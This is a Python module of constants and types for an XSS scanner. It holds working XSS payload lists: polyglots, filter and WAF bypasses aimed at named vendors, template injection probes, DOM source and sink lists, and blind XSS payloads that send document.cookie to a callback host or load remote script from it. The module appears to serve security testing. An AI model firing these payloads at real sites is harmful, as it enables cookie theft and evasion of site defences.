"""
XSS Scanner - Base Types and Constants.

This module contains:
- Enums (XSSContext, WAFType)
- Dataclasses (XSSEvidence, XSSResult, TrackedInput)
- Constants (payloads, DOM sources/sinks, thresholds)

Extracted from xss_scanner.py as part of Phase 7 refactoring (2026-02-26).
"""

from __future__ import annotations

from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any

from utils.scanner_helpers import WAFType as BaseWAFType


# =============================================================================
# VERSION & CONSTANTS
# =============================================================================

XSS_SCANNER_VERSION = "3.0.0-GOD-MODE"

# Minimum confidence to report (anti-false-positive)
MIN_CONFIDENCE_THRESHOLD = 75

# Cross-validation: requires N confirmations
CROSS_VALIDATION_REQUIRED = 1


# =============================================================================
# ENUMS
# =============================================================================

class XSSContext(Enum):
    """XSS injection contexts - Updated for modern frameworks."""
    HTML_TEXT = auto()                # Between tags: <div>HERE</div>
    HTML_ATTRIBUTE = auto()           # Inside attribute: <input value="HERE">
    HTML_ATTRIBUTE_UNQUOTED = auto()  # <input value=HERE>
    HTML_ATTRIBUTE_SINGLE = auto()    # <input value='HERE'>
    JS_STRING = auto()                # var x = "HERE";
    JS_STRING_SINGLE = auto()         # var x = 'HERE';
    JS_TEMPLATE = auto()              # var x = `HERE`;
    JS_BLOCK = auto()                 # <script>HERE</script>
    URL_PARAM = auto()                # href="HERE" or src="HERE"
    CSS_VALUE = auto()                # style="color: HERE"
    SVG_CONTEXT = auto()              # Inside SVG element
    COMMENT = auto()                  # <!-- HERE -->
    # Modern reactive frameworks
    ALPINE_DIRECTIVE = auto()         # x-data="HERE" or x-on:click="HERE"
    HTMX_ATTRIBUTE = auto()           # hx-get="HERE" or hx-post="HERE"
    VUE_DIRECTIVE = auto()            # v-bind:attr="HERE" or :attr="HERE"
    SVELTE_BINDING = auto()           # bind:value="HERE" or on:click="HERE"
    ANGULAR_BINDING = auto()          # [attr]="HERE" or (event)="HERE"
    UNKNOWN = auto()


class WAFType(Enum):
    """Known WAF types - wraps centralized WAFType."""
    CLOUDFLARE = "cloudflare"
    AKAMAI = "akamai"
    AWS_WAF = "aws_waf"
    IMPERVA = "imperva"
    SUCURI = "sucuri"
    MODSECURITY = "modsecurity"
    F5_BIG_IP = "f5_bigip"
    FORTINET = "fortinet"
    BARRACUDA = "barracuda"
    AZURE_WAF = "azure_waf"
    GOOGLE_CLOUD_ARMOR = "gcp_armor"
    WORDFENCE = "wordfence"
    UNKNOWN = "unknown"
    NONE = "none"

    @classmethod
    def from_base(cls, base_waf: BaseWAFType) -> "WAFType":
        """Convert from centralized WAFType to local WAFType."""
        mapping = {
            BaseWAFType.CLOUDFLARE: cls.CLOUDFLARE,
            BaseWAFType.AKAMAI: cls.AKAMAI,
            BaseWAFType.AWS_WAF: cls.AWS_WAF,
            BaseWAFType.IMPERVA: cls.IMPERVA,
            BaseWAFType.SUCURI: cls.SUCURI,
            BaseWAFType.MODSECURITY: cls.MODSECURITY,
            BaseWAFType.F5_BIG_IP: cls.F5_BIG_IP,
            BaseWAFType.FORTINET: cls.FORTINET,
            BaseWAFType.BARRACUDA: cls.BARRACUDA,
            BaseWAFType.AZURE_WAF: cls.AZURE_WAF,
            BaseWAFType.GOOGLE_CLOUD_ARMOR: cls.GOOGLE_CLOUD_ARMOR,
            BaseWAFType.WORDFENCE: cls.WORDFENCE,
            BaseWAFType.UNKNOWN: cls.UNKNOWN,
            BaseWAFType.NONE: cls.NONE,
        }
        return mapping.get(base_waf, cls.UNKNOWN)


# =============================================================================
# DATACLASSES
# =============================================================================

@dataclass
class XSSEvidence:
    """Evidence of XSS vulnerability."""
    payload: str
    context: XSSContext
    reflected_in: str
    encoding_used: str
    waf_bypassed: bool
    response_snippet: str
    confirmation_count: int = 0

    def to_dict(self) -> dict[str, Any]:
        return {
            "payload": self.payload,
            "context": self.context.name,
            "reflected_in": self.reflected_in,
            "encoding_used": self.encoding_used,
            "waf_bypassed": self.waf_bypassed,
            "response_snippet": self.response_snippet[:500],
            "confirmation_count": self.confirmation_count,
        }


@dataclass
class XSSResult:
    """Result of XSS test."""
    vulnerable: bool
    context: XSSContext
    confidence: float
    payload: str
    evidence: list[XSSEvidence] = field(default_factory=list)
    waf_detected: WAFType = WAFType.NONE
    csp_present: bool = False
    csp_bypassed: bool = False


@dataclass
class TrackedInput:
    """
    Tracks inputs submitted during scan for second-order XSS detection.

    Second-order XSS occurs when:
    1. Attacker submits payload at endpoint A (e.g., /profile/update)
    2. Payload is stored in database
    3. Payload renders at DIFFERENT endpoint B (e.g., /admin/users, /reports)
    """
    submit_endpoint: str
    submit_method: str
    field_name: str
    payload: str
    payload_marker: str
    timestamp: float
    response_status: int
    response_contains_marker: bool

    def to_dict(self) -> dict[str, Any]:
        return {
            "submit_endpoint": self.submit_endpoint,
            "submit_method": self.submit_method,
            "field_name": self.field_name,
            "payload": self.payload,
            "payload_marker": self.payload_marker,
            "timestamp": self.timestamp,
            "response_status": self.response_status,
        }


# =============================================================================
# POLYGLOT PAYLOADS - Work in multiple contexts
# =============================================================================

POLYGLOT_PAYLOADS = [
    # Ultimate polyglot - works in HTML, JS string, URL
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    # Multi-context polyglot
    "'\"><img src=x onerror=alert(1)//",
    # JS + HTML context
    "</script><script>alert(1)</script>",
    # Attribute + HTML
    "'\"--><script>alert(1)</script>",
    # URL + HTML
    "javascript:alert(1)//\"><img src=x onerror=alert(1)>",
    # Template literal escape
    "${alert(1)}",
    # SVG polyglot
    "<svg/onload=alert(1)>",
    # Combined attribute escape
    "' onmouseover='alert(1)' x='",
    # Double encoding escape
    "%253Cscript%253Ealert(1)%253C/script%253E",
]


# =============================================================================
# PHP LEGACY BYPASS PAYLOADS
# =============================================================================

PHP_LEGACY_BYPASS_PAYLOADS = [
    # Case variation bypasses
    "<ScRiPt>alert(1)</ScRiPt>",
    "<SCRIPT>alert(1)</SCRIPT>",
    "<IMG SRC=x ONERROR=alert(1)>",
    "<SVG ONLOAD=alert(1)>",
    # Null byte injection
    "<scr\x00ipt>alert(1)</script>",
    # HTML entity encoding bypasses
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    # Double URL encoding
    "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
    # Alternative event handlers
    "<body onpageshow=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<video><source onerror=alert(1)>",
    # Tag variations
    "<svg><script>alert(1)</script></svg>",
    # Attribute injection without quotes
    "<img src=x onerror=alert(1)>",
    # Data URI bypasses
    "<a href=data:text/html,<script>alert(1)</script>>click</a>",
    # JavaScript protocol variations
    "<a href=javascript:alert(1)>click</a>",
    "<a href=&#106;avascript:alert(1)>click</a>",
    # Alert alternatives
    "<script>confirm(1)</script>",
    "<script>prompt(1)</script>",
    "<script>eval('ale'+'rt(1)')</script>",
    # Backtick execution
    "<script>alert`1`</script>",
    "<img src=x onerror=alert`1`>",
]


# =============================================================================
# CONTEXT-SPECIFIC PAYLOADS
# =============================================================================

PAYLOADS_BY_CONTEXT: dict[XSSContext, list[str]] = {
    XSSContext.HTML_TEXT: [
        "<script>alert(XSS)</script>",
        "<img src=x onerror=alert(XSS)>",
        "<svg onload=alert(XSS)>",
        "<body onload=alert(XSS)>",
        "<iframe src='javascript:alert(XSS)'>",
        "<details open ontoggle=alert(XSS)>",
        "<video><source onerror=alert(XSS)>",
        "<audio src=x onerror=alert(XSS)>",
        "<input onfocus=alert(XSS) autofocus>",
        "<a href='javascript:alert(XSS)'>click</a>",
    ],

    XSSContext.HTML_ATTRIBUTE: [
        '" onmouseover="alert(XSS)" x="',
        '" onfocus="alert(XSS)" autofocus x="',
        '" onclick="alert(XSS)" x="',
        '"><script>alert(XSS)</script>',
        '"><img src=x onerror=alert(XSS)>',
        '" style="background:url(javascript:alert(XSS))"',
    ],

    XSSContext.HTML_ATTRIBUTE_SINGLE: [
        "' onmouseover='alert(XSS)' x='",
        "' onfocus='alert(XSS)' autofocus x='",
        "'><script>alert(XSS)</script>",
        "'><img src=x onerror=alert(XSS)>",
    ],

    XSSContext.HTML_ATTRIBUTE_UNQUOTED: [
        " onmouseover=alert(XSS) ",
        " onfocus=alert(XSS) autofocus ",
        "><script>alert(XSS)</script>",
        "><img src=x onerror=alert(XSS)>",
    ],

    XSSContext.JS_STRING: [
        '";alert(XSS);//',
        '"-alert(XSS)-"',
        '";</script><script>alert(XSS)</script>',
        '"+alert(XSS)+"',
    ],

    XSSContext.JS_STRING_SINGLE: [
        "';alert(XSS);//",
        "'-alert(XSS)-'",
        "';</script><script>alert(XSS)</script>",
    ],

    XSSContext.JS_TEMPLATE: [
        "${alert(XSS)}",
        "`-alert(XSS)-`",
        "${`${alert(XSS)}`}",
    ],

    XSSContext.JS_BLOCK: [
        "</script><script>alert(XSS)</script>",
        "</script><img src=x onerror=alert(XSS)>",
        "alert(XSS);",
    ],

    XSSContext.URL_PARAM: [
        "javascript:alert(XSS)",
        "data:text/html,<script>alert(XSS)</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydChYU1MpPC9zY3JpcHQ+",
    ],

    XSSContext.CSS_VALUE: [
        "expression(alert(XSS))",
        "url(javascript:alert(XSS))",
    ],

    XSSContext.SVG_CONTEXT: [
        "<svg onload=alert(XSS)>",
        "<svg><script>alert(XSS)</script></svg>",
        "<svg><animate onbegin=alert(XSS)>",
    ],

    XSSContext.COMMENT: [
        "--><script>alert(XSS)</script><!--",
        "--!><script>alert(XSS)</script>",
    ],

    XSSContext.ALPINE_DIRECTIVE: [
        "'); alert('XSS'); ('",
        "$el.innerHTML='<img src=x onerror=alert(XSS)>'",
    ],

    XSSContext.HTMX_ATTRIBUTE: [
        "javascript:alert('XSS')",
        "data:text/html,<script>alert('XSS')</script>",
    ],

    XSSContext.VUE_DIRECTIVE: [
        "constructor.constructor('alert(XSS)')()",
        "'+alert('XSS')+'",
    ],

    XSSContext.SVELTE_BINDING: [
        "'); alert('XSS'); ('",
        "{@html '<img src=x onerror=alert(XSS)>'}",
    ],

    XSSContext.ANGULAR_BINDING: [
        "constructor.constructor('alert(XSS)')()",
        "{{constructor.constructor('alert(XSS)')()}}",
    ],
}


# =============================================================================
# WAF BYPASS PAYLOADS
# =============================================================================

WAF_BYPASS_PAYLOADS: dict[WAFType, list[str]] = {
    WAFType.CLOUDFLARE: [
        "<svg/onload=alert`XSS`>",
        "<img src=x onerror=alert`XSS`>",
        "<svg onload=\\u0061\\u006C\\u0065\\u0072\\u0074(1)>",
    ],
    WAFType.AKAMAI: [
        "<img src=x onerror='alert(XSS)'>",
        "<svg/onload='alert(XSS)'>",
    ],
    WAFType.AWS_WAF: [
        "<img src=x onerror=alert(XSS)>",
        "<svg onload=alert(XSS)>",
    ],
    WAFType.MODSECURITY: [
        "<scr<script>ipt>alert(XSS)</scr</script>ipt>",
        "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
    ],
    WAFType.IMPERVA: [
        "<svg/onload=alert(String.fromCharCode(88,83,83))>",
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
    ],
    WAFType.WORDFENCE: [
        "<svg/onload=alert`XSS`>",
        "%3Csvg%20onload=alert(1)%3E",
    ],
}


# =============================================================================
# TEMPLATE INJECTION PAYLOADS
# =============================================================================

TEMPLATE_INJECTION_PAYLOADS = [
    # Angular
    ("{{constructor.constructor('alert(1)')()}}", "angular_constructor"),
    ("{{7*7}}", "angular_expression"),
    # Vue.js
    ("{{this.constructor.constructor('alert(1)')()}}", "vue_constructor"),
    ("{{7*7}}", "vue_expression"),
    # EJS
    ("<%= 7*7 %>", "ejs_expression"),
    # Pug/Jade
    ("#{7*7}", "pug_expression"),
]

TEMPLATE_MATH_RESULT = "49"  # 7*7


# =============================================================================
# DOM XSS SOURCES AND SINKS
# =============================================================================

DOM_SOURCES = [
    # URL/Location sources
    "document.URL", "document.documentURI", "document.baseURI", "document.referrer",
    "location", "location.href", "location.search", "location.hash",
    "location.pathname", "window.name", "window.location",
    # Cookie/Storage sources
    "document.cookie", "localStorage", "sessionStorage",
    # Modern URL APIs
    "URLSearchParams", "new URL(", "URL.searchParams",
    # History API
    "history.pushState", "history.replaceState", "history.state",
    # Network sources
    "XMLHttpRequest", "fetch(", "WebSocket(", "EventSource(",
    # Message sources
    "postMessage(", "onmessage", "MessageChannel",
]

DOM_SINKS = [
    # HTML modification
    "innerHTML", "outerHTML", "insertAdjacentHTML",
    "document.write", "document.writeln",
    # Script execution
    "eval(", "Function(", "setTimeout(", "setInterval(",
    # Navigation
    "location.assign", "location.replace", "location.href",
    # Element creation
    "createElement",
    # jQuery sinks
    "$.html(", ".html(", "$.append(", ".append(",
    "$.parseHTML(",
    # Angular
    "$compile(", "$parse(", "bypassSecurityTrust",
]


# =============================================================================
# BLIND XSS PAYLOADS
# =============================================================================

BLIND_XSS_PAYLOADS = [
    '"><script src=https://{callback}/x.js></script>',
    "'><script src=https://{callback}/x.js></script>",
    "<script src=https://{callback}/x.js></script>",
    '"><img src=x onerror="(new Image()).src=\'https://{callback}/?\'+document.cookie">',
    "<img src=x onerror=fetch('https://{callback}/?'+document.cookie)>",
]


# =============================================================================
# EXPORTS
# =============================================================================

__all__ = [
    # Version
    "XSS_SCANNER_VERSION",
    # Constants
    "MIN_CONFIDENCE_THRESHOLD",
    "CROSS_VALIDATION_REQUIRED",
    # Enums
    "XSSContext",
    "WAFType",
    # Dataclasses
    "XSSEvidence",
    "XSSResult",
    "TrackedInput",
    # Payloads
    "POLYGLOT_PAYLOADS",
    "PHP_LEGACY_BYPASS_PAYLOADS",
    "PAYLOADS_BY_CONTEXT",
    "WAF_BYPASS_PAYLOADS",
    "TEMPLATE_INJECTION_PAYLOADS",
    "TEMPLATE_MATH_RESULT",
    "BLIND_XSS_PAYLOADS",
    # DOM XSS
    "DOM_SOURCES",
    "DOM_SINKS",
]
